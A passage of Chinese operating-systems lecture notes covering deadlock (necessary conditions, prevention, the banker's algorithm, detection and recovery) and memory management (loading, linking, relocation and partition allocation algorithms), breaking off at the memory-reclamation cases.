典型：消息 可抢占性资源 某进程在获得这类资源后，该资源可以再被其他进程或系统剥夺 优先权高的进程可以剥夺优先权低的进程的处理机 内存区可由存储器管理程序把一个进程从一个存储区移到另一个存储区，此即剥夺了该进程原来占有的存储区。甚至可将一个进程从内存调出到外存上 CPU和主存均属于可剥夺性资源 多道程序环境下，不会因为竞争可抢占资源而发生死锁。 不可抢占资源 当系统把这类资源分配给某进程后，再不能强行收回，只能在进程用完后自行释放 如磁带机、打印机等 3.5.2 计算机系统中的死锁 竞争资源。当系统中供多个进程共享的资源如打印机、公用队列等，其数目不足以满足诸进程的需要时，会引起诸进程对资源的竞争而产生死锁。 进程间推进顺序非法。进程在运行过程中，请求和释放资源的顺序不当，也同样会导致产生进程死锁。 竞争资源引起的进程死锁 竞争不可抢占性(非剥夺性)资源 在系统中所配置的非剥夺性资源，由于它们的数量不能满足诸进程运行的需要，会使进程在运行过程中，因争夺这些资源而陷入僵局。 例如，系统中只有一台打印机R1和一台磁带机R2，可供进程P1和P2共享。处理不好，在P1与P2之间会形成僵局，引起死锁。 假定P1已占用了打印机R1，P2已占用了磁带机R2。此时，若P2继续要求打印机，P2将阻塞；P1若又要求磁带机，P1也将阻塞。于是，在P1与P2之间便形成了僵局，两个进程都在等待对方释放出自己所需的资源。但它们又都因不能继续获 得自己所需的资源而不能继续推进，从而也不能释放出自己已占有的资源，以致进入死锁状态。 为便于说明，我们用方块代表资源，用圆圈代表进程。当箭头从进程指向资源时，表示进程请求资源；当箭头从资源指向进程时，表示该资源已被分配给该进程。从中可以看出，这时在P1、P2及R1和R2之间已经形成了一个环路，说明已进入死锁状态。 竞争可消耗性(临时性)资源 永久性资源：可顺序重复使用型资源称为永久性资源。 临时性资源，是指由一个进程产生，被另一进程使用一暂短时间后便无用的资源，故也称之为消耗性资源，它也可能引起死锁。 例如：S1、S2和S3是临时性资源，由进程P1、P2和P3产生的消息。如果消息通信处理顺序不当也会发生死锁。 如果消息通信按下述顺序进行： P1： …Release(S1)； Reqaest(S3)； … P2： …Release(S2)； Request(S1)； … P3： …Release(S3)； Request(S2)； … 并不可能发生死锁， P1： …Request(S3)； Release(S1)； … P2： …Request(S1)； Release(S2)； … P3： …Request(S2)； Release(S3)； … 则可能发生死锁。 进程推进顺序不合法引起死锁 进程推进顺序合法 进程推进顺序是合法不会引起进程死锁的。 进程推进顺序非法 若并发进程P1和P2推进顺序不合法，进入不安全状态，于是发生了进程死锁 。 3.5.3 死锁的必要条件和处理方法死锁的定义：如果一组进程中的每一个进程都在等待仅由该组进程中的其他进程才能引发的事件，那么该组的进程是死锁的。(Deadlock) 死锁的发生必须具备下列四个必要条件： 互斥条件。指进程对所分配到的资源进行排它性使用。 请求和保持条件。指进程已经保持了至少一个资源，但又提出了新的资源请求 ，而该资源已被其他进程占用，此时进程被阻塞，但对自己获得的资源保持不放。 不剥夺条件。指进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放。 环路等待条件。在发生死锁时，必然存在一个进程——资源的环形链 处理方法 预防死锁：破坏产生死锁的四个必要条件中的一个或几个条件。 避免死锁：用某种方法去防止系统进入不安全状态。 在资源的动态分配过程中进行。 检测死锁：及时地检测出死锁的发生，确定有关的进程和资源。 解除死锁：撤消或挂起一些进程。 3.6 预防死锁预防死锁的方法是使四个必要条件中的第2、3、4条件之一不能成立，来避免发生死锁。 至于必要条件1，因为它是由设备的固有属性所决定的，不仅不能改变，还应加以保证。 3.6.1 摒弃“请求和保持”条件系统规定所有进程在开始运行之前，都必须一次性地申请其在整个运行过程所需的全部资源。这样，该进程在整个运行期间：便不会再提出资源要求，从而摒弃了请求和保持条件，从而可以避免发生死锁。 这种预防死锁的方法的优点：简单、易于实现且很安全。 缺点：资源被严重浪费，出现饥饿现象，使进程延迟运行。 3.6.2 摒弃“不剥夺”条件进程是逐个地提出对资源的要求的。当一个已经保持了某些资源的进程，再提出新的资源请求而不能立即得到满足时，必须释放它已经保持了的所有资源。待以后需要时再重新申请。从而摒弃了“不剥夺”条件。 这种预防死锁的方法，实现起来比较复杂且要付出很大代价。因为一个资源在使用一段时间后，它的被迫释放可能会造成前段工作的失效。还会使进程前后两次运行的信息不连续 。 3.6.3 摒弃“环路等待”条件这种方法中规定，系统将所有资源按类型进行线性排队，并赋予不同的序号。 所有进程对资源的请求必须严格按照资源序号递增的次序提出，这样，在所形成的资源分配图中，不可能再出现环路，因而摒弃了“环路等待”条件。 存在的问题： 首先是为系统中各类资源所分配（确定）的序号，必须相对稳定，这就限制了新类型设备的增加 作业（进程）使用各类资源的顺序，与系统规定的顺序不同，造成对资源的浪费 限制用户简单、自主地编程 。 3.7 避免死锁3.7.1 系统安全状态 定义：所谓安全状态，是指系统能按某种进程顺序（P1，P2，…，Pn），来为每个进程Pi分配其所需资源，直至满足每个进程对资源的最大需求，使每个进程都可顺利地完成，称系统处于安全状态，称〈P1，P2，…，Pn〉序列为安全序列 。否则，如果系统无法找到这样一个安全序列，则称系统处于不安全状态。（找到一个序列即可） 安全状态实例 假定系统中有三个进程P1、P2和P3，共有12台磁带机。进程P1总共要求10台磁带机，P2和P3分别要求4台和9台。假设在T0** 时刻进程P1、P2和P3已分别获得5台、2台和2台磁带机，尚有3台空闲未分配，在T0时刻系统是否安全？ &lt;P2,P1,P3&gt;,安全。 由安全状态向不安全状态的转换 不按照安全序列分配资源 3.7.2 利用银行家算法避免死锁银行家算法（！！！） 最有代表性的避免死锁的算法，是Dijkstra 的银行家算法。这是由于该算法能用于银行系统现金贷款的发放而得名的。为实现银行家算法，系统中必须设置若干数据结构。 银行家算法中的数据结构 可利用资源向量Available：这是一个含有m个元素的数组，其中的每一个元素代表一类可利用的资源数目。其数值随该类资源的分配和回收而动态地改变。 最大需求矩阵Max：这是一个n×m的矩阵，它定义了系统中n个进程中的每一个进程对m类资源的最大需求。如果Max[i,j]=K，则表示进程i需要Rj类资源的最大数目为K。 分配矩阵Allocation：这是一个n×m的矩阵，它定义了系统中每一类资源当前已分配给每一进程的资源数。如果Allocation[ i,j ]=K，则表示进程Pi当前已分得Rj类资源的数目为K。 需求矩阵Need：这也是一个n×m的矩阵，用以表示每一个进程尚需的各类资源数。如果Need[ i,j ]=K，则表示进程Pi还需要Rj类资源K个，方能完成其任务。 Need[ i,j ] ＝ Max[ i,j ] - Allocation[ i,j ] 银行家算法设Requesti，是进程Pi的请求向量，当Pi发出资源请求后，系统按下述步骤进行检查： 如果Requesti[ j ] ≤ Need[ i,j ], 便转向步骤2；否则认为出错，因为它所需要的资源数已超过它所宣布的最大值。 如果Requesti[ j ] ≤ Available[ j ]，便转向步骤（3）；否则，表示尚无足够资源，Pi须等待。 系统试探着把资源分配给进程Pi，并修改下面数据结构中的数值： Available[ j ] = Available[ j ] — Requesti[ j ]； Allocation[ i,j ] = Allocation[ i,j ] + Requesti[ j ]; ​ Need[ i, j ] = Need[ i, j ] - Requesti[ j ]； 系统执行安全性算法，检查此次资源分配后，系统是否处于安全状态。若安全，才正式将资源分配给进程Pi，以完成本次分配；否则，将本次的试探分配作废，恢复原来的资源分配状态，让进程Pi等待。 安全性算法 （1） 设置两个向量： ①工作向量Work: 它表示系统可提供给进程继续运行所需的各类资源数目，Work = Available ②Finish：开始时先做Finish[i] = false；当有足够资源分配给进程时，再令Finish[i] = true。 （2）从进程集合中找到一个能满足下述条件的进程： ①Finish[i] = false； ②Need[i,j] ≤ work[j]； 找到，执行步骤（3)；否则，执行步骤（4）。 （3）当进程只获得资源后，可顺利执行，直至完成，并释放出分配给它的资源，故应执行： ​ Work[ j ] = Work[ i ] + Allocation[ i,j ]； ​ Finish[ i ] = true; ​ go to step 2 （4）如果所有进程的Finish[i]＝true都满足，则表示系统处于安全状态；否则，系统处于不安全状态。 例题3.8 死锁的检测与解除3.8.1 死锁的检测当系统为进程分配资源时，若未采取任何限制性措施，则系统必须提供检测和解除死锁的手段。 资源分配图该图是由一组结点N和一组边E所组成的一个对偶G＝（N,E）。其中： 把N分为两个互斥的子集，即一组进程结点P={P1,P2，…，Pn）和一组资源结点R={r1, r2, …, rn}，N＝PUR。 凡属于E中的一个边e∈ E都连接着P中的一个结点和R中的一个结点。 e＝{Pi,rj} 它表示进程pj请求一个单位的rj资源。 e={rj，Pi} 它表示把一个单位的资源rj分配给进程Pi。 我们用圆圈代表一个进程，用方框代表一类资源。由于一种类型的资源可能有多个，我们用方框中的一个点代表一类资源中的一个资源。此时，请求边是由进程指向方框中的rj，而分配边则应始于方框中的一个点。图3-20 示出了一个资源分配图。图中，p1进程已经分得了两个r1资源，并又请求一个r2资源；p2进程分得了一个r1和一个r2资源，并又请求r1资源。 死锁定理S为死锁状态的充分条件是：当且仅当S状态的资源分配图是不可完全简化的。该充分条件被称为死锁定理。 在资源分配图中，找出一个既不阻塞又非独立的进程结点Pi。在顺利的情况下，Pi可获得所需资源而继续运行，直至运行完毕，再释放其所占有的全部资源，这相当于消去pi所求的请求边和分配边，使之成为孤立的结点。在图3-21(a)中，将p1的两个分配边和一个请求边消去，便形成图(b)所示的情况。 p1释放资源后，便可使p2获得资源而继续运行，直至p2完成后又释放出它所占有的全部资源，形成图(c)所示的情况。 在进行一系列的简化后，若能消去图中所有的边，使所有的进程结点都成为孤立结点，则称该图是可完全简化的；若不能通过任何过程使该图完全简化，则称该图是不可完全简化的。 对于较复杂的资源分配图，可能有多个既未阻塞，又非孤立的进程结点，不同的简化顺序是否会得到不同的简化图？有关文献已经证明，所有的简化顺序，都将得到相同的不可简化图。同样可以证明：S为死锁状态的充分条件是：当且仅当S状态的资源分配图是不可完全简化的。该充分条件被称为死锁定理。 死锁检测中的数据结构（1）可利用资源向量Available，它表示了m类资源中每一类资源的可用数目。 （2）把不占用资源的进程（Allocation：=0）记入L表中，即Li U L （3）从进程集合中找到一个Requesti≤work的进程，做如下处理： ​ ① Work :＝ Work + Allocationi， ​ ②将它记入L表中。 （4）若不能把所有进程都记入L表中，便表明系统状态S的资源分配图是不可完全简化的。因此，该系统状态将发生死锁。 3.8.2 解除死锁当发现有进程死锁时，常采用的两种方法是解除死锁： 剥夺资源。从其它进程剥夺足够数量的资源给死锁进程，以解除死锁状态。 撤消进程。最简单的撤消进程的方法，是使全部死锁进程都夭折掉；或者按照某种顺序逐个地撤消进程，直至有足够的资源可用，使死锁状态消除为止。 第四章 存储器管理存储器管理的对象主要是内存，由于对外存的管理与对内存的管理类似，只是用途不同（外存主要用于存放文件），所以我们把对外存的管理放在文件管理中介绍。 课程提要 存储器的层次结构 程序的装入和链接 连续分配存储管理方式 基本分页式存储管理方式 基于分段式存储管理方式 虚拟存储器概念 请求分页存储管理方式 抖动与工作集 请求分段存储管理方式 4.1 存储器的层次结构4.1.1 多层结构的存储器系统 可执行存储器：寄存器和主存储器 对于存放于可执行存储器和辅存的信息，计算机所采用的访问机制是不同的，所耗费的时间也是不同的，进程可以在很少的时间周期内使用一条load或store指令对可执行存储器进行访问；但对辅存的访问则需要通过I/O设备实现，访问中涉及到中断、设备驱动程序以及物理设备的运行，所耗费的时间远高于访问可执行存储器的时间，一般相差3个数量级。 主存储器(内存、主存、可执行存储器) 用于保存进程运行时的程序和数据。CPU的控制部件只能从主存中取得指令和数据到CPU寄存器，同样，CPU寄存器中的数据可存入主存。CPU与外设交换数据必须依托主存。 由于主存储器访问速度远低于CPU执行指令的速度，为缓和这一矛盾，在计算机系统中引入寄存器和高速缓存。 用户的程序在运行时应存放在主存中，以便处理机访问 由于主存容量和速度有限。所以把那些不马上使用的程序、数据放在外部存储器(又称辅存)中。当用到时再把它们读入主存。 寄存器 寄存器具有与处理机相同的速度，故对寄存器的访问速度最快，完全能与CPU协同工作，只是价格高昂。 高速缓存 CPU对高速缓存的访问，其速度比访问主存快，比访问寄存器慢。它介于寄存器和存储器之间，主要用于备份主存中比较常用的数据，用于缓和内存与处理机速度之间的矛盾。 根据程序执行的局部性原理，将主存中一些经常访问的数据存放在高速缓存中，减少访问主存的次数，提高程序的执行速度。 有些计算机系统设置了两级高速缓存，即，一级高速缓存与二级高速缓存。 磁盘缓存 使用目的：磁盘的I/O速度远低于对主存的访问速度，为缓和二者速度上的不匹配，设置了磁盘缓冲器，主要用于存放频繁使用的一部分磁盘数据和信息，以减少访问磁盘的次数。但与高速缓存不同，磁盘缓存本身不是一种实际存在的存储器，而是利用主存中的部分存储空间暂时存放从磁盘存读出/写入的信息。（利用主存实现） 辅存的数据必须复制到主存才能使用，数据也必须先存放于主存，才能输出到外存。 4.1.2 存储器管理的目的和功能1.主存储器的分配和管理按用户要求把适当的存储空间分配给相应的作业。一个有效的存储分配机制，应在用户请求时能作出快速的响应，分配相应的存储空间；在用户不再使用它时，应立即回收，以供其他用户使用。 为此，这个存储分配机制应具有如下3个功能： 记住每个存储区域的状态：哪些是已经分配的，哪些是可以用作分配的。 实施分配：在系统或用户提出申请时，按所需的量给予分配；修改相应的分配记录表。 接受系统或用户释放的存储区域：并相应地修改分配记录表。 为了便于对主存储器进行有效的管理，我们把存储器分成若干个区域。即使在最简单的单用户系统中，至少也要把它分成两个区域：在一个存储区域内存放系统软件，如操作系统本身；而另一个存储区域则用于安置用户作业。显然，在多用户系统中，为了提高系统的利用率，需要将存储器划分成更多的区域，以便同时存放多个用户作业。这就引起了存储器分配问题及随之产生的其它问题。 2.提高主存储器的利用率：使多道程序能动态地共享主存，最好能共享主存，最好能共享主存中的信息。 3.“扩充”主存储器容量：借助于提供虚拟存储器或其他自动覆盖技术来达到、即为用户提供比主存储器空间还大的地址空间。 4.存储保护：确保各道作业都在所分配的存储区域内操作，互不干扰。即要防止一道作业由于发生错误而损害其他作业，特别需要防止破坏其中的系统程序。这个问题不能使用特权指令来加以解决，而必须提供硬件保护功能，由软件配合实现。 4.1.3 存储分配的三种方式存储分配：解决多道作业之间共享主存的问题。解决的问题：确定什么时候，以什么方式，把一个作业的全部信息/作业运行时首先需要的信息分配到主存，并使这些问题对于用户而言尽可能“透明”。 解决存储分配的三种方式：1.直接指定方式 程序员在编程的时候，或编译程序（汇编程序）对源程序进行编译（汇编）时，使用实际存储地址。 在多道程序环境下，应保证各作业所用的地址互不重叠。 采用直接指定方式分配的前提是：存储器的可用容量（空间）已经给定或者可以指定，这对单用户计算机系统是不成问题的。 在多道程序发展初期，通常把存储空间划分成若干个固定的不同大小分区，并对不同的作业指定相应的分区。因此，对编程人员或者编译程序而言，存储器的可用空间是可知的。 这种分配方式的实质：由编程人员在编写程序时，或由编程程序编译源程序时，对一个作业的所有信息确定在主存存储空间中的位置。因此，这种直接指定方式的存储方案，不仅用户感到不便，而且存储空间的利用也不那么有效。（缺点） 2.静态分配方式（Static Allocation） 用户在编程时，或由编译程序产生的目的程序，均可从其地址空间的零地址开始；当装配程序对其进行链接装入时才确定它们在主存中的相应位置，从而生成可执行程序。也就是说，存储分配是在装入时实现的。 静态分配方式特点： 在一个作业装入时必须分配其要求的全部存储量 如果没有足够的存储空间，就不能装入该作业 一旦一个作业进入内存后，在其退出系统之前，它一直占用着分配给它的全部存储空间 作业在整个运行过程中不能在内存中“搬家”、也不能再申请存储空间（没有扩展性、可移植性） 静态分配策略的存储管理很简单，但在多道程序系统中不能有效地共享存储器资源。 3.动态分配方式(Dynamic Allocation) 一种更加有效的使用主存储器的方法。 动态存储分配方式的特点： 作业在存储空间中的位置，也是在装入时确定的 在其执行过程中，可根据需要申请附加的存储空间（可扩展性） 一个作业已占用的部分存储区域不再需要时，可以要求归还给系统 即：这种存储分配机制能接受不可预测的分配和释放存储区域的请求，实现个别存储区域的分配和回收 存储区域的大小是可变的 允许作业在内存中“搬家”（可扩展性） 目前，绝大多数计算机系统都采用静态或动态存储分配方式，所以，在本章只讨论这两种存储分配的实现技术，重点放在各种动态存储分配技术的实现上。 4.1.4 基本概念 逻辑地址（相对地址、虚地址） 用户的程序经过汇编或编译后形成目标代码，目标代码通常采用相对地址的形式，其首地址为0，其余指令中的地址都相对于首地址而编址。 注意：不能用逻辑地址在内存中读取信息。 物理地址（绝对地址、实地址） 内存中存储单元的地址，可以直接寻址。 名空间：一个用高级语言编制的源程序，我们说它存在于由程序员建立的符号名字空间（简称名空间） 地址空间：程序用来访问信息所用地址单元的集合，是逻辑（相对）地址集合，由编译程序生成 存储空间：主存中物理单元的集合。这些单元的编号称物理地址或绝对地址。存储空间的大小是由主存的实际容量决定的。 在用汇编语言或高级语言编写的程序中，是通过符号名来访问子程序和数据的。把程序中符号名的集合叫做“名字空间”。汇编语言源程序经过汇编，或者高级语言源程序经过编译，得到的目标程序是以0作为参考地址的模块。然后多个目标模块由连接程序连接成一个具有统一地址的装配模块，以便最后装入内存中执行。把目标模块中的地址称为相对地址，而把相对地址的集合叫做“地址空间”。 4.2 程序的装入和链接在多道程序环境下，程序要运行必须为之创建进程，而创建进程的第一件事情就是要把用户编写好的源程序和数据装入内存。如何将一个用户源程序变为一个可在内存中执行的程序，通常要经过下列几步： 编译：源程序模块是用高级语言或汇编语言写的一组程序语句。计算机不能直接执行源语句，它们要首先被编译程序或解释程序翻译成机器级代码。编译程序(Compiler)接受完整的源一级的程序，并以类似于成批的方式生成完整的目标一级的模块。 链接(Linker)：目标模块是纯二进制的机器级代码。计算机可以执行目标级代码，但是典型的目标模块是不完备的，它包含对其它目标模块（诸如存取方法或子例程）或库函数的引用。因此，目标模块通常是不能装入计算机并执行的。 装入（loader）：由装入程序将装入模块装入内存并执行。 4.2.1 程序的装入根据存储空间的分配方式，将一个装入模块装入内存时，可采用三种方式： 绝对装入方式(Absolute Loading Mode) 在编译时，如果知道程序将驻留在内存的具体位置，那么编译程序将产生实际存储地址（绝对地址）的目标代码 可重定位装入方式(Relocation Loading Mode) 动态运行时装入方式(Denamle Run-time Loading) 4.2.1.1 绝对装入方式装入程序按照装入模块中的地址，将程序和数据装入内存。装入模块被装入内存后，由于程序中的逻辑地址与实际存储地址完全相同，所以不需要对程序和数据的地址进行修改。 程序中所使用的绝对地址既可以在编译或汇编时给出，也可以由程序员直接赋予。但是通常在程序中采用符号地址，然后在编译或汇编时，再将这些符号地址转换为绝对地址。 4.2.1.2 可重定位装入方式 重定位（地址映射/地址转换） 经编译得到的目标模块中为相对地址（通常从0开始），即地址都是相对于0开始的。 装入模块中的逻辑地址与实际装入内存的物理地址不同 装入内存时，相对地址（数据、指令地址）要作出相应的修改以得到正确的物理地址，这个修改的过程称为重定位 重定位就是把程序的逻辑地址空间变换成内存中的实际物理地址空间的过程，也就是说在装入时对目标程序中指令和数据的修改过程。 根据地址变换进行的时间及采用技术手段不同： 静态重定位 地址变换是在装入内存时一次完成的，且以后不能移动 一般情况下有： 物理地址=相对地址 + 内存中的起始地址 适用于多道程序环境，可将装入模块装入到内存中任何允许的位置 数据地址和指令地址都需要做同样的修改 优点：不需要硬件支持，可以装入有限多道程序 缺点：一个程序通常要占用连续的内存空间，程序装入内存后不能移动，不易实现共享 动态重定位 4.2.1.3 动态运行时装入方式装入程序将装入模块装入内存后，并不立即把装入模块中的相对地址转换为绝对地址，而是把这种地址转换推迟到程序执行时进行。在硬件地址变换机构的支持下，随着对每条指令或数据的访问自动进行地址变换，故称为动态重定位。 最简单的办法是利用一个重定位寄存器(RR)**。该寄存器的值是由进程调度程序根据作业分配到的存储空间起始地址来设定**的。 在具有这种地址变换机构的计算机系统中，当执行作业时，不是根据CPU给出的有效地址去访问主存，而是将有效地址与重定位寄存器中的内容相加后得到的地址作为访问主存的地址。 有效地址 = 重定位寄存器内容 + 相对地址 由于这种地址变换是在作业执行期间随着每条指令的数据自动地、连续地进行，所以称之为动态重定位。 采用动态重定位技术后，程序中所有指令和数据的实际地址是在运行过程中最后访问的时刻确定的。也就是说，在作业运行过程中临时申请分配附加的存储区域或释放已占用的部分存储空间是允许的。 主要优点： ​ ①主存的使用更加灵活有效。这里，一个用户的作业不一定要分配在一个连续的存储区，因而可以使用较小的分配单位。而且，在作业开始之前也不一定把它的地址空间全部装入主存，而可在作业执行期间响应请求动态地进行分配。 ​ ②几个作业共享一程序段的单个副本比较容易。 ​ ③有可能向用户提供一个比主存的存储空间大得多的地址空间。因而无需用户来考虑覆盖结构，而由系统来负责全部的存储管理。 主要缺点： ①需要附加硬件支持； ②实现存储器管理的软件比较复杂。 4.2.2 程序的链接链接程序的功能：将经过编译后所得到的一组目标模块以及它们所需要的库函数，装配成一个完整的装入模块。 根据链接时间的不同，可把链接分成如下三种： 静态链接(Static Linking) 装入时动态链接(Load-Time Dynamic Linking) 运行时动态链接(Run-Time Dynamic Linking) 4.2.2.1 静态链接 说明：将几个目标链接装配成一个装入模块时，需解决以下两个问题： 将相对地址进行修改。即将除第一个模块外的相对地址修改成装入模块中的相应的相对地址。 变换外部调用符号。即将每个模块中所用的外部调用符号，都变换为相对地址。例如将call B变换为JSR “L” ​ 这种先进行链接所形成的一个完整的装入模块，又称为可执行文件。 4.2.2.2 装入时动态链接用户源程序经编译后所得到的目标模块，是在装入内存时，边装入边链接的。即在装入一个目标模块时，若发生一个外部模块调用，将引起装入程序去找出相应的外部目标模块，并将其装入内存。 优点： 便于软件版本的修改和更新。只需修改各个目标模块，不必将装入模块拆开，非常方便。 便于实现目标模块共享。即可以将一个目标模块链接到几个应用模块中，从而实现多个应用程序对该模块的共享。 4.2.2.3 运行时动态链接采用装入时动态链接方式，虽然可将一个装入模块装入到内存的任何地方，但装入模块的结构是静态的，表现在： 进程（程序）在整个执行期间，装入模块是不改变的 每次运行时的装入模块是相同的 并且事先无法知道本次要运行哪些模块，只能将所有可能要运行的模块在装入时全部链接在一起，而实际上往往有些目标模块根本不会运行。 采用运行时动态链接可将某些目标模块的链接推迟到执行时才进行，即在执行过程中，若发现一个被调用模块尚未装入内存时，由OS去找到该模块，将它装入内存，并链接到调用模块上。 主要优点： 凡是在执行过程中未被用到的目标模块，都不会被调入内存和被链接到装入模块上，这样不仅可加快程序的装入过程，而且可节省大量的内存空间。 运行时动态链接是目前最常使用的链接方式。 4.3 连续分配存储管理方式 连续分配：为用户程序分配一个连续的内存空间。 程序空间本类就是连续的。 用连续的内存装入连续的程序，减少管理工作的难度。 连续分配方式分类： 单一连续分配 单用户系统在一段时间内，只有一个进程在内存，故内存分配管理十分简单，内存利用率低。内存分为两个区域，一个供操作系统使用，一个供用户使用。 分区式分配方式 系统把内存用户区划分为若干分区，分区大小可以相等，也可以不等。一个进程占据一个分区。这是早期用于多道程序的一种较简单的存储管理方式。它又可以分为： 固定分区分配 动态分区分配 动态可重定位分区分配 4.3.1 单一连续分配内存中仅驻留一道用户程序，整个用户区为一个用户独占。 内存分为两个区域：系统区，用户区。应用程序装入到用户区，可使用用户区全部空间。 最简单，适用于单用户、单任务的OS。 优点：易于管理。 缺点： ​ 对要求内存空间少的程序，造成内存浪费 ​ 程序全部装入，很少使用的程序部分也占用内存 ​ 例如：DOS 2.0以下的DOS操作系统采用单一连续区域主存管理方法。 4.3.2 固定分区分配固定分区分配思想：将内存用户空间划分为若干个固定大小的区域，每个区域称为一个分区（region），在每个分区中只装入一道作业 ，从而支持多道程序并发设计。 由于这些存储区域是在系统启动时划定的，在用户作业装入及运行过程中，其区域的大小和边界是不能改变的。 固定式分区的划分方法有两种： 分区大小相等 当程序太小时，会造成内存空间的浪费 。当程序太大时，一个分区又不足以装入该程序，致使该程序无法运行。 分区大小不等 可把内存区划成含有多个较小的分区、适量的中等分区及少量的大分区。 为了实现这种固定分区的分配，系统需要建立一张分区说明表。这个分区说明表指出可用于分配的分区数以及每个区的大小、起始地址及状态。 内存分配过程？ 当有作业要装入内存时，内存分配程序检索分区说明表，从中找出一个尚未使用的满足大小要求的分区分配给该作业，然后修改分区的状态；如果找不到合适的分区就拒绝为该作业分配内存。 内存中已分配给用户但未被利用的区域称为“内零头”（内碎片） 固定分区分配有内零头产生。 优点：易于实现，开销小。 缺点： ​ 内碎片造成浪费 ​ 分区总数固定，限制了并发执行的程序数目。 ​ 存储空间的利用率太低，现在的操作系统几乎不用它了。 采用的数据结构：分区表－记录分区的大小和使用情况 4.3.3 动态分区分配为了减少存储区域的内零头，进一步提高主存的利用率，使存储空间的划分更加适应不同的作业组合，设计了动态(可变)式分区方案。 动态分区分配是指根据进程的实际需要，动态地为之分配连续的内存空间。即分区的边界可以移动，分区的大小是可变的。 动态分区又有两种不同选择： 分区的数目固定大小是可变的 假定系统初始化时规定把存储空间划分为8个分区。在下图(a)中用问号(?)来表示它们。在系统运行一段时间后，已有192K存储空间分配给7个作业，剩下64K还未分配，如下图(b)所示。现在，又有两个作业 P和Q准备调入，它们每个需要32K存储空间。显然，我们有足够的存储空间。却没有足够数的存储区域(目前只有一个可用)。因此，只能允许一个作业(如：P)被调入，如下图(c)所示。 允许分区的数目和大小都是可变的 第二种方案(分区数目可变)：最初，没有建立任何分区，整个可用的存储空间用一个问号来表示；之后，发生上述所说在系统运行一段时间后，已有192K存储空间分配给7个作业，剩下64K还未分配的情况，如图(b)；现在，我们在剩下的64K存储空间中，可以创建两个分区，分别装入作业P和Q，如图(c)。显然，此方案比第一个方案更灵活，内存利用率更高。 分区分配中的数据结构 常用数据结构 空闲分区表 空闲分区链 分区分配算法 系统运行一段时间后，在整个存储空间内将出现许多大小不等的区域，有的仍被作业进程占用，有的则因作业已退出系统而成为可用于再分配的区域。现在假设有一个新的作业需调入主存，如何为其选择一个合适的区域？ 基于顺序搜索 最佳适应算法(Best Fit) 最坏适应算法(Worst Fit) 首次适应算法(First Fit) 循环首次(下次)适应算法(Next Fit) 基于索引搜索 伙伴系统 快速适应算法(Quick Fit) 哈希算法 各个算法详解 最佳适应算法(Best Fit:BF) 就是为一作业选择分区时，总是寻找其大小最接近作业所要求的存储区域。即：把作业放入这样的分区后剩下的零头最小。 优点：如果存储空间中具有正好是所要求大小的存储空白区，则必然被选中；如果不存在这样的空白区，也只对比要求稍大的空白区进行划分，而绝不会去划分一个更大的空白区。因此，其后遇到大作业到来时，作业要求的存储区域就比较容易得到满足。 缺点：在每次分配时，总是产生最小的空白区。因此，经过一段时期后，存储空间中可能留许多这样的空白区，由于其太小而无法使用。 为了改善这种情况，在该算法中设置一参数G，用它来确定最小分区的大小。当选择一个分区时，如果选中的空白区与要求的大小之差小于G，则不再对它划分，而把整个这个空白区分配给申请的作业。 为了加快查找速度，应将存储空间中所有的空白区按其大小递增的顺序链接起来，组成一空白区链(Free List)。 最佳适应算法的另一缺点是：在回收一个分区时，为了把它插入到空白区链中合适的位置上也颇为费时。所以，这种算法乍看起来是最佳的，其实则不然。 最坏适应算法(Worst Fit:WF) 在为作业选择存储区域时，总是寻找最大的空白区。在划分后剩下的空白区也是最大的，因而对以后的分配很可能仍然是有用的，这是该算法的一个优点。但是，由于最大的空白块总是首先被分配而进行划分，当有大的作业时，其存储空间的申请往往得不到满足，这是该算法的一个缺点。 为了支持这个算法的实现，空白块应以大小递减的顺序链接起来。 首次适应算法(First Fit:FF) 每个空白区按其在存储空间中地址递增的顺序链在一起，即每个后继空白区的起始地址总是比前者的大。在为作业分配存储区域时，从这个空白区链的始端开始查找，选择第一个足以满足请求的空白块，而不管它究竟有多大。 选择的空白区被分成两部分。一部分与请求的大小相等，分配给作业；剩下的部分留在空白区链中。 显然，这个算法倾向于优先利用存储空间中低址部分的空白区。 优点：算法简单，查找速度快；留在高址部分的大的空白区被划分的机会较少，因而在大作业到来时也比较容易得到满足。 缺点：这种算法常常利用一个大的空白区适应小作业的请求，从而留下一些较小的无法用的空白区，存储空间利用率不高；而且，由于所有的请求都是从空白区链的始端开始查找，因而这些小而无用的空白区集中在这个链的前端，相应地，一些较大空白区在链的尾端才能发现，这种情况将使找到合适空白区的速度降低。 在低地址部分会积累大量外零头。 内零头与外零头 内零头 分配给用户但用户没有使用的空间 “多分配的空间” 外零头 没有分配但无法分配的空间 太小而无法分配，“分不出去的空间” 单一连续分配有较大的内零头 分区分配有小于一个分区的内零头 循环首次适应算法(Next Fit:NF) 首次适应算法的一种变形，故也被称为带旋转指针的首次适应算法 把存储空间中空白区构成一个循环链。每次为存储请求查找合适的分区时，总是从上次查找结束的地方开始，只要找到一个足够大的空白区，就将它划分后分配出去。 显然，采用这一策略后，存储空间的利用更加均衡，而不至于使小的空白区集中于存储器的一端。但是，在存储器的另一端也不可能保留大的空白块，因此，当需要获得相当大的空白区时，能满足的可能性减少了。 快速适应算法(Quick Fit:QF) 将空闲分区根据其容量大小进行分类，对于每一类具有相同容量的所有空闲分区，单独设立一个空闲分区链表。 这样，系统中存在多个空闲分区链表； 同时，在内存中设立一张管理分区类型，并记录了该类型空闲分区链表表头的索引表，该表的每一个表项记录了对应类型空闲分区链表表头的指针。 分配过程：根据进程的长度，寻找到能容纳它的最小空闲分区链表，并取下第一块进行分配即可。 优点： 查找效率高。 该算法在进行空闲分区分配时，不会对任何分区产生分割，所以能保留大的分区，满足对大空间的需求，也不会产生内存碎片。 缺点： 在分区归还主存时算法复杂，系统开销较大。 该算法在分配空闲分区时是以进程为单位，一个分区只属于一个进程，因此在为进程所分配的一个分区中，或多或少地存在一定的浪费。空闲分区划分越细，浪费则越严重。 以空间换时间。 涉及动态分区的主要操作有分配内存和回收内存。这些操作是在程序接口中通过系统调用发出的。 1.分配内存：向操作系统提出一特定存储量的请求。通常，它并不要求这个分配的存储区域限于特定的位置，但是，这个区域必须是连续的。 系统利用某种分配算法，从空闲分区链(表)中找到所需大小的分区。 请求的分区大小为u.size 表中每个空闲分区的大小为m.size size是事先规定的不再切割的剩余分区的大小 2.回收内存： 进程用于归还一个不再需用的存储区域。 当进程运行完毕释放内存时，系统根据回收区的首址，从空闲区链(表)中找到相应的插入点。 在回收一个分区时，一个回收的分区与空白区邻接的情况有四种，对这四种情况分别作如下处理： 